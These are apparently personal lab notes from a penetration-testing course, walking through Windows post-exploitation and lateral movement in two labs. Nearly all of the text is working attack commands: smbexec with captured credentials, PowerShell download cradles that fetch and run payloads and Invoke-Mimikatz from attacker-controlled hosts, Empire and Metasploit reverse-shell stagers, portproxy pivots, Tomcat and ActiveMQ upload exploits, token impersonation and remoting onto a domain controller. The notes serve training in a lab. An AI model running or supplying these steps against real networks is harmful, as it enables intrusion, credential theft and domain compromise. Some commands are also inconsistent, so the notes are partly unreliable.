@echo off  net use "\\10.100.11.150\C$" /user:local_admin P@ssw0rd123  if exist "\\10.100.11.150\C$\Program_Files\MSBuild\ErrorLog.txt" (      echo "Copying errors..."      copy "\\10.100.11.150\C$\Program_Files\MSBuild\ErrorLog.txt" C:\Users\local_admin\Logs\Host1\      del "\\10.100.11.150\C$\Program_Files\MSBuild\ErrorLog.txt" ) else (      echo "No errors!" )  net use "\\10.100.11.150\C$" /delete

```

- we discovered a new ip and credentials

```
10.100.11.150
local_admin:P@ssw0rd123
```

> now that we have credentials, lets smbexec into it

```powershell
john㉿kali)-[/opt/impacket/examples]
└─$ sudo python3 smbexec.py 'local_admin:P@ssw0rd123'@172.16.80.100 

	ipconfig
	echo %userdomain%

```

```powershell
powershell -c iex (New-Object Net.WebClient).DownloadFile('http://10.100.11.101:8000/payload2.exe', 'C:\Windows\Temp\payload.exe')
```

- after some time configuring Empire

```powershell
sudo powershell-empire server
sudo powershell-empire client
```

### in Empire:
listeners
uselistener http
info
set Host <kali ip>
execute
main

usestager multi/launcher
set listener http
execute

copy the payload and execute into the first shell from smbexec
// we should get a shell back from Empire = they call this agent

agents
interact <agent number>
// its the same as session -i <number> from Metasploit

usemodule situation_awareness/network/arpscan
set CIDR 10.100.11.0/24
set Agent <agent number>
execute

- we discovered 2 hosts: 100 e 101

```powershell
	MAC               Address      
---               -------      
00:50:56:A0:4F:BC 10.100.11.1  
00:50:56:A0:13:FF 10.100.11.100
00:50:56:A0:53:98 10.100.11.101
00:50:56:A0:53:98 10.100.11.255
```

### now lets search for open ports
usemodule powershell/situational_awareness/network/portscan
set Hosts 10.100.11.100 = ip of the target found
set Agent <agent number>
execute

```powershell
Hostname      OpenPorts       
--------      ---------       
10.100.11.100 445,139,135,8443
```

### Passing the session to Metasploit, because we will need to do some Pivot
In Metasploit:
```powershell
use exploit/multi/script/web_delivery
set target 2 = powershell
set SRVHOST <kali ip>
set payload windows/meterpreter/reverse_tcp
set lhost <kali ip>
exploit -j
copy the URL
```

in Empire:
```powershell
usemodule code_execution/invoke_metasploitpayload
set URL <the URL from metasploit module>
set Agent <agent number>
execute
```

> here, we should get a meterpreter session 


in Metasploit:
we are dealing with different networks, so we will need to set an autoroute
```powershell
use post/multi/manage/autoroute
set session 1
run

use auxiliary/server/socks_proxy
set srvhost <kali ip>
run
```

remember the port must be the same as proxychains.conf file
now we can set our browser, in the proxy config, in the socks session, set the kali ip with the right port
we can open the page 10.100.11.100:8443 from that weird port that was open
a apache tomcat 7.0.81 page opens, if we search For vulnerability For that version of apache	

-  we get CVE-2017-12617
	metasploit has this exploit, but first we need to set a proxy


- why do we need to set a proxy?
	because its a internal network, we got set the proxy, For the target of the internal network can receive our payload

```powershell
use post/windows/manage/portproxy
set CONNECT_ADDRESS <kali ip>
set CONNECT_PORT 4444
set LOCAL_ADDRESS 10.100.11.101 = its the first host we compromise.
set LOCAL_PORT 4444
set session 1
run

use exploit/multi/http/tomcat_jsp_upload_bypass
set options
set payload java/jsp_shell_reverse_tcp
set rport 8443 = that is the port that we access the apache page
run
// we should get a shell back
```

### upgrade the shell to a meterpreter shell
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.100.11.101 LPORT=4444 -f exe > /tmp/payload.exe

python3 -m http.server 8000
```

### lets add another port in the portproxy
use post/windows/manage/portproxy
```powershell
set CONNECT_ADDRESS <kali ip>
set CONNECT_PORT 8000
set LOCAL_ADDRESS 10.100.11.101 = its the first host we compromise.
set LOCAL_PORT 8000
set session 1
run
```

> [!NOTE] cool

### set a handler
```powershell
jobs -K = to kill all jobs opens
use exploit/multi/handler
set options
set lport 4444 = the port that we opened with portproxy
exploit -j
```

in the Java shell:
```powershell
powershell -c iex (New-Object Net.WebClient).DownloadFile('http://10.100.11.101:8000/payload.exe', 'C:\Windows\Temp\payload.exe')
```

// then execute it
	C:\windows\temp\payload.exe

> we should gain a shell back from meterpreter from our handler

### Obtain Hashes using Mimikatz

in Java session:
```powershell
	powershell -c iex (New-Object Net.WebClient).DownloadString('http://10.100.11.101:8000/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```

> of course, make sure the **Invoke-Mimikatz** is in the python web host directory.
this cradle will download and execute the Invoke-Mimikatz
we should get hashes back

### Extra [+]  PSINJECT

// PSINJECT is the same as migrate from metasploit but its from Empire
```powershell
interact <agent number>
shell ps

searchmodule psinject
usemodule management/psinject
set Agent <agent number>
set Listener http
set ProcId <the PID from the process you wanna migrate, in this case lsass>
execute
```

> this should open a new agent (session)
just type agents to visualize




## Lab 2 Powershell for post-exploitation and Lateral Movement

targets network: 172.17.80.0/24

myip: 175.13.80.5

### gather information
```bash
sudo nmap -sn -oG - 172.17.80.* | awk '/Up$/ {print $2}'
fping -a -g 172.17.80.0/24 2>/dev/null > hostsup

- 172.17.80.1
- 172.17.80.100
```

### Exploit Apache ActiveMQ
// we found that port 8161 is running Apache ActiveMQ, so I searched For that version in metasploit 
	exploit(multi/http/apache_activemq_upload_jsp)
and got a shell.

// ip discovered: 10.100.11.101

in Meterpreter session:
```powershell
run autoroute -s 10.100.11.0/24
```

### Token Impersonation
use incognito
list_tokens -u
impersonate_token ELS-CHILD\\local_admin

### Sending PowerView to the target
open a web host with python
then send and execute the file:
```powershell
powershell "IEX (New-Object Net.WebClient).DownloadString('http://175.13.80.5:8000/PowerView.ps1'); Get-NetDomainController"
```

### Results
```
Forest                     : eLS.local
CurrentTime                : 1/8/2022 11:36:28 PM
HighestCommittedUsn        : 209035
OSVersion                  : Windows Server 2012 R2 Standard
Roles                      : {PdcRole, RidRole, InfrastructureRole}
Domain                     : els-child.eLS.local
IPAddress                  : 10.100.10.253
SiteName                   : Default-First-Site-Name
SyncFromAllServersCallback : 
InboundConnections         : {18be55e6-23fd-4162-ab64-6b2cf34040e5}
OutboundConnections        : {e308ece2-539f-4f7a-9fc2-fee4e5adfd31}
Name                       : child-dc01.els-child.eLS.local
Partitions                 : {CN=Configuration,DC=eLS,DC=local, CN=Schema,CN=Co
                             nfiguration,DC=eLS,DC=local, DC=ForestDnsZones,DC=
                             eLS,DC=local, DC=els-child,DC=eLS,DC=local...}

```

> [+]
// DC
els.child.eLS.local
10.100.10.253

### local_admin is a local administrator of the domain controller
```powershell
powershell "IEX (New-Object Net.WebClient).DownloadString('http://175.13.80.5:8000/PowerView.ps1'); Find-LocalAdminAccess"
```

### going back to SYSTEM
```bash
ctrl+z the shell
in Meterpreter:
	rev2self
```

### search for files
```powershell
search -f *.txt

found a file uat_teste_account.txt with credentials:
	Username: ELS-CHILD\local_admin
	Password: P@ssw0rd123 
```

### arp scanner
use post/windows/gather/arp_scanner
set options
// we found a new ip 10.11.100.101

### set a proxy to the internal network
use post/windows/manage/portproxy
```powershell
set CONNECT_ADDRESS <kali ip>
set CONNECT_PORT 4444
set LOCAL_ADDRESS 10.100.11.101
set LOCAL_PORT 4444 
set SESSION 1
run
```

### powershell_remoting to execute commands in that internal network
use exploit/windows/local/powershell_remoting
```powershell
set SMBUSER local_admin
set SMBPASS P@ssw0rd123
set SMBDOMAIN ELS-CHILD
set RHOSTS 10.100.11.100
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.100.11.101
set LPORT 4444
exploit -j
```

> we should get a shell back from the win10 machine


### to execute commands on the DC, we just need to modify the powershell_remoting
```powershell
set SESSION 2 = the win10 machine
set RHOSTS 10.100.10.253 = the IP of DC
exploit -j
```

> now we should have a shell from the DC

### download cradles used
```powershell
powershell "iex (New-Object Net.WebClient).DownloadFile('http://10.100.11.101:8000/payload.exe', 'C:\Windows\Temp\payload.exe')"

powershell "IEX (New-Object Net.WebClient).DownloadString('http://175.13.80.5:8000/shell.exe')
```



